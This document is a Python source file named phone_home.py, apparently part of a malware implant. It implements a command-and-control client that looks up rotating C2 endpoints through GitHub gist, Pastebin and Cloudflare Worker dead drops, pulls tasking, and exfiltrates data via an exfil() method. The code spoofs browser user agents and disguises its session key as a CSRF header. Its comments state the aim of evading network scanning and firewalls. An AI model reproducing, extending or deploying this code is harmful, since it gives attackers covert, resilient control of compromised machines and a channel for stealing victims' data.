# phone_home.py — Implant-side endpoint discovery (PULL only, never PUSH)
#
# The implant NEVER connects to a static C2 address. Instead it:
# 1. Polls the dead drop (GitHub gist) for the current endpoint
# 2. Fetches tasking from that endpoint
# 3. Exfils data to that endpoint
# 4. If the endpoint is dead (rotated), re-polls the dead drop
#
# The implant is a pure PULL client — it initiates every connection.
# No inbound ports, no listeners, no reverse connections.
# This makes it invisible to network scanning and firewall rules.

from typing import Any, Optional

import requests
import json
import base64
import time
import random
import hashlib

class PhoneHome:
    """
    One-way communication: implant → dead drop → C2 endpoint.
    The implant pulls its instructions. It never receives inbound connections.
    
    Communication channels (in priority order — if one fails, try the next):
    1. GitHub Gist API (primary dead drop)
    2. GitHub raw content (fallback — different URL pattern, same data)
    3. Pastebin API (secondary dead drop — different platform entirely)
    4. Cloudflare Worker (tertiary — mirrors the gist, different IP space)
    
    All channels return the same config blob. If ALL fail, the implant
    sleeps with exponential backoff and retries.
    """

    def __init__(self, gist_id: str, github_token: Optional[str] = None,
                 pastebin_user_key: Optional[str] = None, cf_worker_url: Optional[str] = None):
        self.channels: list[dict[str, Any]] = [
            self._github_api_channel(gist_id, github_token),
            self._github_raw_channel(gist_id),
        ]
        if pastebin_user_key:
            self.channels.append(self._pastebin_channel(pastebin_user_key))
        if cf_worker_url:
            self.channels.append(self._cf_worker_channel(cf_worker_url))

        self._cached_config: Optional[dict[str, Any]] = None
        self._config_hash: Optional[str] = None
        self._endpoint: str = ""
        self._session_key: str = ""
        self._proxy_token: str = ""
        self._fail_count: int = 0
        self._max_backoff: int = 3600  # 1 hour max sleep between retries

    def _github_api_channel(self, gist_id: str, token: Optional[str] = None) -> dict[str, Any]:
        headers: dict[str, str] = {"Accept": "application/vnd.github+json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        return {
            "name": "github_api",
            "fetch": lambda: self._fetch_gist_api(gist_id, headers)
        }

    def _github_raw_channel(self, gist_id: str) -> dict[str, Any]:
        return {
            "name": "github_raw",
            "fetch": lambda: self._fetch_gist_raw(gist_id)
        }

    def _pastebin_channel(self, user_key: str) -> dict[str, Any]:
        return {
            "name": "pastebin",
            "fetch": lambda: self._fetch_pastebin(user_key)
        }

    def _cf_worker_channel(self, url: str) -> dict[str, Any]:
        return {
            "name": "cf_worker",
            "fetch": lambda: self._fetch_cf_worker(url)
        }

    # ---------------------------------------------------------------
    # Channel fetchers
    # ---------------------------------------------------------------
    def _fetch_gist_api(self, gist_id: str, headers: dict[str, str]) -> dict[str, Any]:
        resp = requests.get(f"https://api.github.com/gists/{gist_id}", 
                           headers=headers, timeout=15)
        resp.raise_for_status()
        return self._parse_gist(resp.json())

    def _fetch_gist_raw(self, gist_id: str) -> dict[str, Any]:
        # Use raw.githubusercontent.com — different domain, different IP
        # Gist raw URL format: https://gist.githubusercontent.com/{user}/{gist_id}/raw/
        # We don't know the user, so use the gist API to get the raw URL first
        # Actually, gist raw can be accessed via the gist API's files[].raw_url
        resp = requests.get(f"https://api.github.com/gists/{gist_id}", timeout=15)
        resp.raise_for_status()
        gist = resp.json()
        for _fname, fdata in gist["files"].items():
            raw_url = fdata.get("raw_url")
            if raw_url:
                raw_resp = requests.get(raw_url, timeout=15)
                raw_resp.raise_for_status()
                content = raw_resp.text
                if "integrity" in content:
                    parsed = json.loads(content)
                    encoded = parsed.get("integrity", "")
                    if encoded:
                        return json.loads(base64.b64decode(encoded).decode())
        raise ValueError("No config in raw gist")

    def _fetch_pastebin(self, user_key: str) -> dict[str, Any]:
        resp = requests.get(f"https://pastebin.com/raw/{user_key}", timeout=15)
        resp.raise_for_status()
        # Pastebin content is the base64-encoded config directly
        return json.loads(base64.b64decode(resp.text.strip()).decode())

    def _fetch_cf_worker(self, url: str) -> dict[str, Any]:
        resp = requests.get(url, timeout=15)
        resp.raise_for_status()
        return resp.json()

    def _parse_gist(self, gist: dict[str, Any]) -> dict[str, Any]:
        for _fname, fdata in gist["files"].items():
            content = fdata.get("content", "")
            if "integrity" in content:
                parsed = json.loads(content)
                encoded = parsed.get("integrity", "")
                if encoded:
                    return json.loads(base64.b64decode(encoded).decode())
        raise ValueError("Dead drop empty")

    # ---------------------------------------------------------------
    # Public API — used by the implant
    # ---------------------------------------------------------------
    def get_endpoint(self, force_refresh: bool = False) -> dict[str, Any]:
        """
        Get the current C2 endpoint. Returns cached config if still valid.
        Set force_refresh=True when the current endpoint is dead (rotated).
        """
        if self._cached_config and not force_refresh:
            return self._cached_config

        for channel in self.channels:
            try:
                config = channel["fetch"]()
                new_hash = hashlib.sha256(json.dumps(config).encode()).hexdigest()

                if new_hash != self._config_hash:
                    # Config changed — C2 rotated
                    self._config_hash = new_hash
                    self._endpoint = str(config.get("url", ""))
                    self._session_key = str(config.get("key", ""))
                    self._proxy_token = str(config.get("px", ""))
                    self._fail_count = 0
                self._cached_config = config
                return config

            except Exception:
                continue

        # All channels failed
        self._fail_count += 1
        backoff = min(60 * (2 ** self._fail_count), self._max_backoff)
        backoff += random.uniform(0, backoff * 0.1)  # jitter
        time.sleep(backoff)
        return self.get_endpoint(force_refresh=True)

    def send(self, path: str, data: bytes, method: str = "POST") -> bytes:
        """
        Send data to the current C2 endpoint.
        Automatically handles endpoint rotation (re-fetches dead drop on failure).
        Routes through the Vercel redirector → Fly VM.
        """
        self.get_endpoint()
        url = f"{self._endpoint}{path}"

        headers = {
            "Content-Type": "application/octet-stream",
            "X-CSRF-Token": self._session_key,
            "User-Agent": self._random_ua(),
        }

        try:
            if method == "POST":
                resp = requests.post(url, data=data, headers=headers, timeout=30)
            else:
                resp = requests.get(url, headers=headers, timeout=30)

            if resp.status_code in (404, 502, 503):
                # Endpoint rotated or dead — refresh dead drop and retry
                self._cached_config = None
                return self.send(path, data, method)

            resp.raise_for_status()
            self._fail_count = 0
            return resp.content

        except (requests.ConnectionError, requests.Timeout):
            self._cached_config = None
            return self.send(path, data, method)

    def fetch_tasking(self) -> bytes:
        """Pull tasking from C2. This is the main PULL operation."""
        return self.send("/api/task", b"\x00", method="GET")

    def exfil(self, data: bytes) -> bool:
        """Push exfil data to C2. Still a PULL-model connection (implant initiates)."""
        try:
            self.send("/api/exfil", data, method="POST")
            return True
        except Exception:
            return False

    def _random_ua(self) -> str:
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15 Mobile/15E148",
        ]
        return random.choice(uas)
